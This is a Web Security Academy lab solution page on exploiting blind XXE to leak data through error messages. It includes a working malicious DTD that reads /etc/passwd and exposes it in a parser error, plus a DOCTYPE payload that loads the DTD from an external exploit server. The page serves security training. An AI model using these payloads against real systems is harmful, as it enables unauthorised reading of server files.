# Lab: Exploiting blind XXE to retrieve data via error messages

Source: https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages
Fetched: 2026-06-28T09:18:06.851499+00:00

Web Security Academy

XXE injection

Blind

Lab

Lab: Exploiting blind XXE to retrieve data via error messages

This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, use an external DTD to trigger an error message that displays the contents of the /etc/passwd file.

The lab contains a link to an exploit server on a different domain where you can host your malicious DTD.

Solution

Click "Go to exploit server" and save the following malicious DTD file on your server:

<!ENTITY % file SYSTEM "file:///etc/passwd">

<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">

%eval;

%exfil;

When imported, this page will read the contents of /etc/passwd into the file entity, and then try to use that entity in a file path.

Click "View exploit" and take a note of the URL for your malicious DTD.

You need to exploit the stock checker feature by adding a parameter entity referring to the malicious DTD. First, visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.

Insert the following external entity definition in between the XML declaration and the stockCheck element:

<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>

You should see an error message containing the contents of the /etc/passwd file.

Community solutions

Garr_7

Michael Sommer (no audio)

Find XSS vulnerabilities using Burp Suite

Try for free
